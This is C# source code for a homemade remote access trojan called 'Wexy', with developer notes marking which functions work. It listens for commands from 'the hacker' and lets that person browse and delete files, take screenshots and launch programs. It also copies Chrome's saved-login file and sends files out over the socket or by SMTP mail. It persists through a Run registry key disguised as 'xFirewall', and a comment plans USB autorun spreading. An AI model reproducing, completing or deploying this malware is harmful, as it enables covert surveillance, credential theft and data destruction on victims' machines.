using System.Net.Sockets;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System;
using System.Drawing.Imaging;
using System.Net.Mail;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Data;
using System.Security.Cryptography;
using Mono.Nat;


namespace Wexy_Server
{
    public class Server
    {
        public static NetworkStream Receiver;
        public static NetworkStream Writer;
        public static TcpListener listenner ;
        public static System.Threading.Thread Rec;
        public static TcpClient client;
   
        public static void ReceiveCommands()
        {
            
            //Infinite loop 
            while (true)
            {
                //try to read the data from the client(the hacker)
               
                try
                {
                    //Packet of the received data
                    byte[] RecPacket = new byte[1000];

                    //Read a command from the client.
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Flush the receiver
                    Receiver.Flush();

                    //Convert the packet into readable string
                    string command = Encoding.ASCII.GetString(RecPacket);

                    //Split the command into two different strings based on the splitter we made, >
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(command, ">");

                    //Get the actual command.
                    command = CommandArray[0];

                    switch (command)
                    {
                        case "msg":
                            //Display a message
                            string Msg = CommandArray[1];
                            DisplayMessage(Msg);
                            break;

                        case "open":
                            //Open a website with Internet Explorer
                            string site = CommandArray[1];
                            OpenWebsite(site);
                            break;

                        case "pcname":
                            //Get the computer name
                            SendPCName();
                            break;

                        case "showfiles":
                            //Show files in a folder
                            string dir = CommandArray[1];
                            ListFiles(dir);
                            break;

                        case "showfolders":
                            //Show sub-directories in a folder
                            string path = CommandArray[1];
                            ListFolders(path);
                            break;

                        case "del":
                            //Delete a file
                            string location = CommandArray[1];
                            deleteFile(location);
                            break;

                        case "getFile":
                            //Send a file to mail
                            string filePath = CommandArray[1];
                             string sender = CommandArray[2];
                            string sender_pass = CommandArray[3];
                            string to_mail = CommandArray[4];
                            getFile(filePath, sender,sender_pass, to_mail);
                            break;

                        case "openApp":
                            //Open an application
                            string appName = CommandArray[1];
                            openApp(appName);
                            break;

                        case "show":
                            //Sending pending data
                            SendPendingData();
                            break;
                        case "getos":
                            //Get the OS Version
                            getOSVersion();
                            break;

                        case "ischruser":
                            //Tell if the user has a google chrome user profile
                            isChromeUser();
                            break;

                        case "copylogindata":
                            //Copy the file Login Data to Login Data.FILE to make it sendable via mail
                            copyLoginData();
                            break;

                        case "download":
                            //download a file from the remote computer
                            string filepath = CommandArray[1];
                            sendFile(filepath);
                            break;

                        case "screenshot":
                            SendScreenshot();
                            break;

                        case "killwexy":
                            KillWexy();
                            break;
                    }
                }
                catch
                {
                    break;
                }
            }
        }

        #region Commands

        // - ALMOST OK - 
        public static void KillWexy()
        {
            //RemoveFromStartup();
            Environment.Exit(0);
        }

        // - ALMOST OK - [Files are not completely downloaded, also it changes the stream bytes]
        public static void SendScreenshot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(@"C:/users/"+Environment.UserName+"/desktop/screen.jpg", ImageFormat.Jpeg);

            string screenpath = "C:/users/" + Environment.UserName + "/desktop/screen.jpg";
            FileInfo fileInfo = new FileInfo(screenpath);
            Stream s = client.GetStream();
            byte[] filebytes = File.ReadAllBytes(screenpath);
            s.Write(filebytes, 0, filebytes.Length);
            File.Delete(screenpath);
        }

        // - ALMOST OK - [Files are not completely downloaded]
        public static void sendFile(string filePath)
        {
            FileInfo fileInfo = new FileInfo(filePath);
            Stream s = client.GetStream();
            byte[] filebytes = File.ReadAllBytes(filePath);
            s.Write(filebytes, 0, filebytes.Length);
        }
        
        // - ALMOST OK - 
        public static void isChromeUser()
        {
            
            while (Directory.Exists("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default"))
            {
                string response = "not user";
                byte[] Packet = Encoding.ASCII.GetBytes(response);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
                break;
            }
        }
        // - ALMOST OK - 
        public static void getOSVersion()
        {
            string osversion = Environment.OSVersion.ToString();
            byte[] Packet = Encoding.ASCII.GetBytes(osversion);
            Writer.Write(Packet, 0, Packet.Length);
            Writer.Flush();
        }

        // - ALMOST OK - 
        public static void openApp(string applicationName)
        {
            System.Diagnostics.Process app = new System.Diagnostics.Process();
            app.StartInfo.FileName = applicationName;
            app.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
            app.Start();
        }

        // - ALMOST OK - crashes when trying to access protected folders like c:/users/welsen/cookies
        public static void ListFolders(string location)
        {
            string[] xfolders = Directory.GetDirectories(location);
            if (xfolders.Length == 0)
            {
                string response = "no folders here...";
                byte[] Packet = Encoding.ASCII.GetBytes(response);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            else
            {
                string[] directories = xfolders;

                string folders = "";
                foreach (string item in directories)
                {
                    folders = folders + item + "/\n";
                }

                byte[] Packet = Encoding.ASCII.GetBytes(folders);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            
        }

        // - ALMOST OK - It doesn't display the first file and the last ones , only a few files..
        public static void ListFiles(string location)
        {
            string files = "";
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(location);
            FileInfo[] file = dir.GetFiles("*.*");
            if (file.Length != 0)
            {
                foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
                {
                    files = files + "\n" + f.Name + " | " + f.Length.ToString() + " bytes";
                }
                byte[] Packet = Encoding.ASCII.GetBytes(files);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            else
            {
                files = "no files here...";
                byte[] Packet = Encoding.ASCII.GetBytes(files);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }           
        }

        // - ALMOST OK - 
        public static void SendPendingData()
        {
            try
            {
                string nothing = "";

                //Creates a packet to hold the command, and gets the bytes from the string variable
                byte[] Packet = Encoding.ASCII.GetBytes(nothing);

                //Send the command over the network
                Writer.Write(Packet, 0, Packet.Length);

                //Flush out any extra data that didnt send in the start.
                Writer.Flush();
            }
            catch
            {
                Console.WriteLine("client disconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }

        // - ALMOST OK - [Multiple blank lines generated after the Computer name is received.]
        public static void SendPCName()
        {
            try
            {
                string pcname = Environment.UserName;
                byte[] Packet = Encoding.ASCII.GetBytes(pcname);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch
            {
                Console.WriteLine("client disconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }

        // - ALMOST OK - [Crashes a few seconds after sending the file]
        public static void getFile(string location,string from, string password, string to)
        {
            try
            {
                //Configure the stmp client
                SmtpClient client = new SmtpClient("smtp.live.com");
                client.Port = 587;
                client.EnableSsl = true;
                client.Timeout = 100000;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Credentials = new System.Net.NetworkCredential(from, password);

                //Configure the mail to send
                Attachment objAttachment = new Attachment(location);
                MailMessage msg = new MailMessage();
                msg.To.Add(to);
                msg.From = new MailAddress(from);
                msg.Attachments.Add(objAttachment);
                msg.Subject = "New file !";
                msg.Body = "A new file was downloaded from the remote computer";

                client.Send(msg);
            }
            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
            {
                //Environment.Exit(0);
                string response = "An error has occured while trying to send the mail";
                byte[] Packet = Encoding.ASCII.GetBytes(response);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        // - OK -
        public static void copyLoginData()
        {
            try
            {
                File.Copy("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/Login Data", "C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/Login Data.FILE");
            }
            catch
            { }
        }

        // - OK - 
        public static void OpenWebsite(string website)
        {
            System.Diagnostics.Process IE = new System.Diagnostics.Process();
            IE.StartInfo.FileName = "iexplore.exe";
            IE.StartInfo.Arguments = website.Trim('\0');
            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
            IE.Start();
        }

        // - OK - 
        public static void DisplayMessage(string message)
        {
            System.Windows.Forms.MessageBox.Show(message.Trim('\0'));
        }

        // - OK - 
        public static void deleteFile(string location)
        {
            File.Delete(location);
        }

        // - OK - 
        public static void addToStartup()
        {
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
                .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("xFirewall", "\"" + Application.ExecutablePath + "\"");
            }
        }

        // - OK - 
        public static void RemoveFromStartup()
        {
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
                .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("xFirewall", false);
            }
        }

        #endregion

        static void Main(string[] args)
        {
            //Deploiement idée :
            //Clé usb avec un autorun , lorsqu'elle est branchée sur un pc , la clé va copier l'executable sur le système et executer l'application
            //Egalement , faudrait qu'elle me donne l'adresse IP de la machine dans la clé usb.

            //addToStarup();
            listenner = new TcpListener(IPAddress.Any, 1000);
            //listenner = new TcpListener(IpAdress.Parse("external_ip", 2000); <- not working , gotta find another way for it to work online
            listenner.Start();

            for (int i = 0; i < 10; i++) // < - not the best way
            {
                client = listenner.AcceptTcpClient();
                Receiver = client.GetStream();

                Writer = client.GetStream();

                Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
                Rec.Start();
            }        
        }
    }
}
